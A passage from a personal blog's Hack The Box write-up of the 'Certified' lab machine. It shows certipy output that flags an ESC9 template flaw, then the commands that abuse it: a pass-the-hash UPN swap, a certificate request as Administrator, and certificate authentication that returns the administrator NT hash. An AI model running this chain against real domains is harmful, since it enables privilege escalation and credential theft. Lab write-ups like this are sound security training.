+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Finding certificate templates
+</span></span><span class="line"><span class="cl">[*] Found 34 certificate templates
+</span></span><span class="line"><span class="cl">[*] Finding certificate authorities
+</span></span><span class="line"><span class="cl">[*] Found 1 certificate authority
+</span></span><span class="line"><span class="cl">[*] Found 12 enabled certificate templates
+</span></span><span class="line"><span class="cl">[*] Trying to get CA configuration for &#39;certified-DC01-CA&#39; via CSRA
+</span></span><span class="line"><span class="cl">[!] Got error while trying to get CA configuration for &#39;certified-DC01-CA&#39; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+</span></span><span class="line"><span class="cl">[*] Trying to get CA configuration for &#39;certified-DC01-CA&#39; via RRP
+</span></span><span class="line"><span class="cl">[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+</span></span><span class="line"><span class="cl">[*] Got CA configuration for &#39;certified-DC01-CA&#39;
+</span></span><span class="line"><span class="cl">[*] Enumeration output:
+</span></span><span class="line"><span class="cl">Certificate Authorities
+</span></span><span class="line"><span class="cl">  0
+</span></span><span class="line"><span class="cl">    CA Name                             : certified-DC01-CA
+</span></span><span class="line"><span class="cl">    DNS Name                            : DC01.certified.htb
+</span></span><span class="line"><span class="cl">    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
+</span></span><span class="line"><span class="cl">    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
+</span></span><span class="line"><span class="cl">    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
+</span></span><span class="line"><span class="cl">    Certificate Validity End            : 2124-05-13 15:43:41+00:00
+</span></span><span class="line"><span class="cl">    Web Enrollment                      : Disabled
+</span></span><span class="line"><span class="cl">    User Specified SAN                  : Disabled
+</span></span><span class="line"><span class="cl">    Request Disposition                 : Issue
+</span></span><span class="line"><span class="cl">    Enforce Encryption for Requests     : Enabled
+</span></span><span class="line"><span class="cl">    Permissions
+</span></span><span class="line"><span class="cl">      Owner                             : CERTIFIED.HTB\Administrators
+</span></span><span class="line"><span class="cl">      Access Rights
+</span></span><span class="line"><span class="cl">        ManageCertificates              : CERTIFIED.HTB\Administrators
+</span></span><span class="line"><span class="cl">                                          CERTIFIED.HTB\Domain Admins
+</span></span><span class="line"><span class="cl">                                          CERTIFIED.HTB\Enterprise Admins
+</span></span><span class="line"><span class="cl">        ManageCa                        : CERTIFIED.HTB\Administrators
+</span></span><span class="line"><span class="cl">                                          CERTIFIED.HTB\Domain Admins
+</span></span><span class="line"><span class="cl">                                          CERTIFIED.HTB\Enterprise Admins
+</span></span><span class="line"><span class="cl">        Enroll                          : CERTIFIED.HTB\Authenticated Users
+</span></span><span class="line"><span class="cl">Certificate Templates
+</span></span><span class="line"><span class="cl">  0
+</span></span><span class="line"><span class="cl">    Template Name                       : CertifiedAuthentication
+</span></span><span class="line"><span class="cl">    Display Name                        : Certified Authentication
+</span></span><span class="line"><span class="cl">    Certificate Authorities             : certified-DC01-CA
+</span></span><span class="line"><span class="cl">    Enabled                             : True
+</span></span><span class="line"><span class="cl">    Client Authentication               : True
+</span></span><span class="line"><span class="cl">    Enrollment Agent                    : False
+</span></span><span class="line"><span class="cl">    Any Purpose                         : False
+</span></span><span class="line"><span class="cl">    Enrollee Supplies Subject           : False
+</span></span><span class="line"><span class="cl">    Certificate Name Flag               : SubjectRequireDirectoryPath
+</span></span><span class="line"><span class="cl">                                          SubjectAltRequireUpn
+</span></span><span class="line"><span class="cl">    Enrollment Flag                     : NoSecurityExtension
+</span></span><span class="line"><span class="cl">                                          AutoEnrollment
+</span></span><span class="line"><span class="cl">                                          PublishToDs
+</span></span><span class="line"><span class="cl">    Private Key Flag                    : 16842752
+</span></span><span class="line"><span class="cl">    Extended Key Usage                  : Server Authentication
+</span></span><span class="line"><span class="cl">                                          Client Authentication
+</span></span><span class="line"><span class="cl">    Requires Manager Approval           : False
+</span></span><span class="line"><span class="cl">    Requires Key Archival               : False
+</span></span><span class="line"><span class="cl">    Authorized Signatures Required      : 0
+</span></span><span class="line"><span class="cl">    Validity Period                     : 1000 years
+</span></span><span class="line"><span class="cl">    Renewal Period                      : 6 weeks
+</span></span><span class="line"><span class="cl">    Minimum RSA Key Length              : 2048
+</span></span><span class="line"><span class="cl">    Permissions
+</span></span><span class="line"><span class="cl">      Enrollment Permissions
+</span></span><span class="line"><span class="cl">        Enrollment Rights               : CERTIFIED.HTB\operator ca
+</span></span><span class="line"><span class="cl">                                          CERTIFIED.HTB\Domain Admins
+</span></span><span class="line"><span class="cl">                                          CERTIFIED.HTB\Enterprise Admins
+</span></span><span class="line"><span class="cl">      Object Control Permissions
+</span></span><span class="line"><span class="cl">        Owner                           : CERTIFIED.HTB\Administrator
+</span></span><span class="line"><span class="cl">        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
+</span></span><span class="line"><span class="cl">                                          CERTIFIED.HTB\Enterprise Admins
+</span></span><span class="line"><span class="cl">                                          CERTIFIED.HTB\Administrator
+</span></span><span class="line"><span class="cl">        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
+</span></span><span class="line"><span class="cl">                                          CERTIFIED.HTB\Enterprise Admins
+</span></span><span class="line"><span class="cl">                                          CERTIFIED.HTB\Administrator
+</span></span><span class="line"><span class="cl">        Write Property Principals       : CERTIFIED.HTB\Domain Admins
+</span></span><span class="line"><span class="cl">                                          CERTIFIED.HTB\Enterprise Admins
+</span></span><span class="line"><span class="cl">                                          CERTIFIED.HTB\Administrator
+</span></span><span class="line"><span class="cl">    [!] Vulnerabilities
+</span></span><span class="line"><span class="cl">      ESC9                              : &#39;CERTIFIED.HTB\\operator ca&#39; can enroll and template has no security extension
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>To exploit this. We need to change the upn of user ca_operator to administrator. Since we have genericWrite this is possible.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584:a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then as user ca_operator we request the certificate. Yiou can see the template name from the output above.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">certipy-ad req -username  ca_operator@certified.htb -password &#39;p@ssw0rd!&#39; -ca certified-DC01-CA  -template CertifiedAuthentication
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Requesting certificate via RPC
+</span></span><span class="line"><span class="cl">[*] Successfully requested certificate
+</span></span><span class="line"><span class="cl">[*] Request ID is 11
+</span></span><span class="line"><span class="cl">[*] Got certificate with UPN &#39;Administrator&#39;
+</span></span><span class="line"><span class="cl">[*] Certificate has no object SID
+</span></span><span class="line"><span class="cl">[*] Saved certificate and private key to &#39;administrator.pfx&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We get an admninistrator.pfx, we need to change the upn back to ca_operator.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584:a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can now use the cert to authenticaate and get administrator nthash.</p>
+<p>certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[*] Using principal: administrator@certified.htb
+</span></span><span class="line"><span class="cl">[*] Trying to get TGT...
+</span></span><span class="line"><span class="cl">[*] Got TGT
+</span></span><span class="line"><span class="cl">[*] Saved credential cache to &#39;administrator.ccache&#39;
+</span></span><span class="line"><span class="cl">[*] Trying to retrieve NT hash for &#39;administrator&#39;
+</span></span><span class="line"><span class="cl">[*] Got hash for &#39;administrator@certified.htb&#39;: aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>root.txt :)</p>
+<hr>
+<p>We have pwned  CERTIFIED.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/htb_monitored/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/cover/htb.svg" loading="lazy" data-key="" data-hash="/cover/htb.svg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Htb_monitored</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/htb_surveillance/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/cover/htb.svg" loading="lazy" data-key="" data-hash="/cover/htb.svg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Htb_surveillance</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/htb-pc/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/cover/htb.svg" loading="lazy" data-key="" data-hash="/cover/htb.svg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB PC</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/htb-monitortwo/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/cover/htb.svg" loading="lazy" data-key="" data-hash="/cover/htb.svg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB Monitortwo</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script
+    src="https://giscus.app/client.js"
+    data-repo="f0rk3b0mb/f0rk3b0mb.github.io"
+    data-repo-id="R_kgDOJkJRlQ"
+    data-category="General"
+    data-category-id="DIC_kwDOJkJRlc4CbrS7"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="1"
+    data-lang="en"
+    crossorigin="anonymous"
+    async
+></script>
+<script>
+    function setGiscusTheme(theme) {
+        let giscus = document.querySelector("iframe.giscus-frame");
+        if (giscus) {
+            giscus.contentWindow.postMessage(
+                {
+                    giscus: {
+                        setConfig: {
+                            theme: theme,
+                        },
+                    },
+                },
+                "https://giscus.app"
+            );
+        }
+    }
+
+    (function () {
+        addEventListener("message", (e) => {
+            if (event.origin !== "https://giscus.app") return;
+            handler();
+        });
+        window.addEventListener("onColorSchemeChange", handler);
+
+        function handler() {
+            if (document.documentElement.dataset.scheme === "light") {
+                setGiscusTheme('1');
+            } else {
+                setGiscusTheme('dark_dimmed');
+            }
+        }
+    })();
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2023 - 
+        
+        2024 f0rk3b0mb
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
